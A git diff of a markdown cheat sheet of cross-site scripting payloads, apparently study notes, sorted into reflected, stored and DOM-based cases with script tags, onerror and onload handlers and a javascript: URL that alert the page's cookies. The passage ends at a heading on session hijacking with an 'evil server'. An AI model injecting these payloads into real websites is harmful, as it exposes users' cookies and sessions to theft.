@@ -1,13 +1,45 @@
 # basic payload
+
+### reflected:
 ```
 <h1>xss try</h1>
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
+```
+### stored :
+```
 <img src="does-not-exist" onerror="alert(document.cookie)">
 
-“>img src=x onerror=alert(1)>
-
+“>img src=x onerror=alert(1)
+````
+### DOM :
+1) document.write :
 ```
+"><svg onload=alert(1)>
+" onload = "alert(document.cookies)
+```
+![image](https://github.com/user-attachments/assets/5b231551-8a4f-4300-a7e5-25cb89105e48)
+
+
+2) innerHTML :
+```
+<img src="does-not-exist" onerror="alert(document.cookie)">
+```
+
+![image](https://github.com/user-attachments/assets/50dbf402-56d7-447d-a27c-d401301192f1)
+
+
+3) jQuery anchor href :
+
+after the path
+
+```javascript:alert(document.cookie)```
+
+and click backlink
+
+
+   ![image](https://github.com/user-attachments/assets/c9b00d4c-ea24-4c01-aadb-3471141427c4)
+
 # XSS attack 1: Hijacking the user’s session
 ## Evil server 
 ```bash
